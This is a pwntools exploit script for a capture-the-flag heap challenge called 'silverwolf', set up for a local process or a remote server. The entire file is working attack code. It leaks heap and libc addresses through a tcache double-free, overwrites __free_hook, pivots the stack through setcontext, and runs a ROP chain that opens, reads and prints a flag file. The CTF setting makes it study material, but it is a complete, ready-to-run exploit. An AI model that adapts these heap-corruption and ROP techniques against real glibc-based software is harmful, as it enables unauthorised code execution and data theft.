#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./silverwolf'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('124.71.231.29', 21504)
    libc = ELF('./libc-2.27.so', checksec=False)
elf = ELF('./silverwolf', checksec=False)
libc_one = [0x4f3d5, 0x4f432, 0xe5617, 0xe561e, 0xe5622, 0x10a41c, 0x10a428]

def add(size):
    p.sendlineafter("Your choice: ","1")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Size: ",str(size)) #<0x78

def edit(content):
    p.sendlineafter("Your choice: ","2")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Content: ",content)
    
def show():
    p.sendlineafter("Your choice: ","3")
    p.sendlineafter("Index: ",str(0))
    p.recvuntil("Content: ")

def free():
    p.sendlineafter("Your choice: ","4")
    p.sendlineafter("Index: ",str(0))
size = 0x30
add(size) # 920
free()
gdb.attach(p,'b *$rebase(0x0FD0)\n')
edit(p64(0)*2) # 920

free() # 920
show() # 920
heapbase = u64(p.recv(6).ljust(8,"\x00")) - 0x1920

add(size)
add(size)
add(size) # 950

free()
add(0x40)
p.sendlineafter("Your choice: ",'1' * 0x410)

add(size)
show()
libc.address = u64(p.recv(6).ljust(8,"\x00")) - 176 - 0x10 - libc.sym['__malloc_hook']
# set rsp
size = 0x10
add(size)
free()
edit(p64(0)*2)
free()
add(size)
edit(p64(libc.sym['__free_hook'] + 0xa0 + 0x10))
add(size)
add(size)
edit(p64(heapbase + 0x18c0) + p64(libc.search(asm("pop rsp ; ret")).next() + 0x20))

add(0x50)
edit(p64(heapbase + 0xe98))
# set setcontext
size = 0x78
add(size)
free()
edit(p64(0)*2)
free()
add(size)
edit(p64(libc.sym['__free_hook'] + 0x10))
add(size)
pd = './flag\x00\x00'
pd += p64(libc.search(asm("pop rdi ; ret")).next() + 0x20)
pd += p64(0) # 0x10
pd += p64(libc.search(asm("pop rsi ; ret")).next() + 0x20)
pd += p64(heapbase + 0xe98 + 0x38) # flag 0x20
pd += p64(libc.search(asm("pop rdx ; ret")).next() + 0x20)
pd += p64(0x100) # 0x30
pd += p64(libc.sym['read'] + 0x20)

edit(pd)
add(size)
edit(p64(libc.sym['setcontext'] + 0x35 + 0x20))
success("heapbase                      = " + hex(heapbase))
success("libc.address                  = " + hex(libc.address))
success("libc.sym['__free_hook']       = " + hex(libc.sym['__free_hook']))
success("libc.sym['setcontext'] + 0x35 = " + hex(libc.search(asm("pop rsp ; ret")).next()))
# gdb.attach(p, 'b *setcontext+53\nb *setcontext+127\nc')
free()
pd = p64(libc.search(asm("pop rdi ; ret")).next() + 0x20)
pd += p64(heapbase + 0xe90)
pd += p64(libc.search(asm("pop rax ; ret")).next() + 0x20)
pd += p64(2)
pd += p64(libc.search(asm("pop rsi ; ret")).next() + 0x20)
pd += p64(0)
pd += p64(libc.search(asm("syscall ; ret")).next() + 0x20)
pd += p64(libc.search(asm("pop rdi ; ret")).next() + 0x20)
pd += p64(3)
pd += p64(libc.search(asm("pop rsi ; ret")).next() + 0x20)
pd += p64(heapbase + 0x1000) # flag
pd += p64(libc.search(asm("pop rdx ; ret")).next() + 0x20)
pd += p64(0x100)
pd += p64(libc.sym['read'] + 0x20)

pd += p64(libc.search(asm("pop rdi ; ret")).next() + 0x20)
pd += p64(1)
pd += p64(libc.sym['write'] + 0x20)
success("syscall = " + hex(libc.search(asm("syscall;ret")).next() - libc.address))
p.sendline(pd)
p.interactive()


